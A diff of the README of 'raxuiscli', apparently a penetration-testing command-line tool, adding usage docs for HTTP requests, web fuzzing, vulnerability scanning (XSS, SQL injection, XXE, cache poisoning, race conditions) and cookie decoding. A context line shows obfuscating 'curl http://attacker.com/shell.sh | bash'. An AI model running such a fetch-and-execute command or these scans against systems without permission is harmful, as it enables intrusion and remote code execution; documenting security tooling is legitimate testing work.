@@ -670,6 +670,174 @@ raxuiscli obfuscate bash "curl http://attacker.com/shell.sh | bash"
 
 ---
 
+### Web Security
+
+#### `http` - HTTP Requests
+Custom HTTP requests with security header analysis.
+
+```bash
+# GET request
+raxuiscli http get https://example.com
+
+# POST with JSON data
+raxuiscli http post https://api.com -d '{"user":"test"}'
+
+# PUT request
+raxuiscli http put https://api.com/item/1 -d '{"name":"new"}'
+
+# DELETE request
+raxuiscli http delete https://api.com/item/1
+
+# HEAD request (headers only)
+raxuiscli http head https://example.com
+
+# OPTIONS request
+raxuiscli http options https://api.com
+
+# Security headers analysis
+raxuiscli http headers https://example.com
+
+# Trace redirects
+raxuiscli http trace https://bit.ly/xxx
+
+# Generate curl command
+raxuiscli http curl https://api.com -X POST -d '{"x":1}'
+```
+
+**Use cases:**
+- API testing and debugging
+- Security header verification
+- Redirect chain analysis
+- Request crafting
+
+---
+
+#### `fuzz` - Web Fuzzing
+Directory, parameter, and virtual host discovery.
+
+```bash
+# Directory brute force
+raxuiscli fuzz dir https://example.com -w dirs.txt
+raxuiscli fuzz dir https://example.com --common          # Built-in wordlist
+raxuiscli fuzz dir https://example.com -e php,html,txt   # With extensions
+
+# Parameter fuzzing
+raxuiscli fuzz param "https://site.com?q=test" -w params.txt
+raxuiscli fuzz param "https://site.com" --common
+
+# Virtual host discovery
+raxuiscli fuzz vhost https://10.10.10.10 -w vhosts.txt
+raxuiscli fuzz vhost https://target.com -d example.com    # With domain suffix
+```
+
+**Use cases:**
+- Hidden directory discovery
+- Parameter enumeration
+- Virtual host enumeration
+- Content discovery
+
+---
+
+#### `vuln` - Vulnerability Scanning
+Comprehensive web vulnerability detection.
+
+```bash
+# Quick scan (all basic checks)
+raxuiscli vuln scan "https://site.com?id=1"
+raxuiscli vuln scan "https://site.com?q=test" --level 3   # Aggressive
+
+# XSS testing
+raxuiscli vuln xss "https://site.com?q=test"
+raxuiscli vuln xss "https://site.com?name=foo" --level 3
+
+# SQL injection
+raxuiscli vuln sqli "https://site.com?id=1"
+raxuiscli vuln sqli "https://site.com?cat=1" --level 3
+
+# Local File Inclusion
+raxuiscli vuln lfi "https://site.com?file=about.php"
+
+# Security headers
+raxuiscli vuln headers https://example.com
+
+# CORS misconfiguration
+raxuiscli vuln cors https://api.com
+raxuiscli vuln cors https://api.com --origin "https://evil.com"
+raxuiscli vuln cors https://api.com --full
+
+# NoSQL injection (MongoDB)
+raxuiscli vuln nosqli "https://api.com/users?id=1"
+raxuiscli vuln nosqli "https://api.com/login" -d '{"user":"test","pass":"test"}'
+raxuiscli vuln nosqli "https://api.com" --level 3
+
+# XXE (XML External Entity)
+raxuiscli vuln xxe https://api.com/upload
+raxuiscli vuln xxe https://api.com --payload file
+raxuiscli vuln xxe https://api.com --oob http://callback.com
+
+# GraphQL security
+raxuiscli vuln graphql https://api.com/graphql
+raxuiscli vuln graphql https://api.com/graphql --introspect
+raxuiscli vuln graphql https://api.com/graphql --dos
+
+# Host header injection
+raxuiscli vuln host https://example.com
+raxuiscli vuln host https://example.com --poison   # Password reset poisoning
+raxuiscli vuln host https://example.com --cache    # Cache poisoning
+
+# Race conditions
+raxuiscli vuln race "https://api.com/transfer" -d '{"amount":100}' --requests 50
+raxuiscli vuln race "https://api.com/redeem" -d '{"code":"PROMO"}' --requests 20
+
+# List payloads
+raxuiscli vuln payloads xss --level 3
+raxuiscli vuln payloads sqli --level 2
+raxuiscli vuln payloads nosqli
+```
+
+**Use cases:**
+- Web application security testing
+- OWASP Top 10 detection
+- API security assessment
+- GraphQL endpoint security
+- Race condition testing
+
+---
+
+#### `cookie` - Cookie Analysis
+Cookie decoding and security analysis.
+
+```bash
+# Decode cookie value
+raxuiscli cookie decode "eyJhZG1pbiI6dHJ1ZX0="
+
+# Analyze security flags
+raxuiscli cookie analyze "session=abc; HttpOnly; Secure"
+
+# Flask session decode
+raxuiscli cookie flask ".eJx..." --secret "key"
+
+# Express session decode
+raxuiscli cookie express "s:..." --secret "key"
+
+# Detect session type
+raxuiscli cookie detect ".eJxNjDEOwCAIAP..."
+
+# Find sensitive data
+raxuiscli cookie sensitive '{"user":"admin","role":"admin"}'
+
+# Bulk analysis
+raxuiscli cookie bulk "sess=x" "user=y" "token=z"
+```
+
+**Use cases:**
+- Session cookie analysis
+- Framework session decoding
+- Cookie security assessment
+- Sensitive data detection
+
+---
+
 ### Utilities
 
 #### `encode` - Encoding/Decoding
@@ -780,11 +948,11 @@ See [ROADMAP.md](ROADMAP.md) for progress and upcoming features.
 | Sprint 1 | Network (dns, whois, recon) | ✅ 100% |
 | Sprint 1.5 | Red Team Tools (15 commands) | ✅ 100% |
 | Sprint 2 | Cryptography (cipher, jwt, keygen, certinfo) | ✅ 100% |
-| Sprint 3 | Web Security | ⏳ Coming soon |
+| Sprint 3 | Web Security (http, fuzz, vuln, cookie) | ✅ 100% |
 | Sprint 4 | Binary Analysis | ⏳ Coming soon |
 | Sprint 5 | Utilities | ⏳ Coming soon |
 
-**Current progress: 22/31 commands (71%)**
+**Current progress: 26/31 commands (84%)**
 
 ---
 
